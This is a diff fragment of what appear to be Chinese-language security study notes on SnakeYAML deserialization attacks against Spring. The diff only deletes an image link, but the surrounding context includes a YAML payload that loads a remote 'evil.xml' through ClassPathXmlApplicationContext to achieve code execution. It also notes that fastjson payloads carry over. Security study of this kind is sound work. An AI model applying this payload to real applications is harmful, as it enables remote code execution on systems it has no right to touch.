@@ -193,8 +193,6 @@ Spring当中有两个类的构造函数远程加载配置，可以构成RCE
 
 > !!org.springframework.context.support.ClassPathXmlApplicationContext [\"http://127.0.0.1:8888/evil.xml\"]
 
-![image-20230815143625162](./../.gitbook/assets/image-20230815143625162.png)
-
 既然能触发getter，那么fastjson的大部分payload也可以用。
 
 ## 写文件加载本地jar
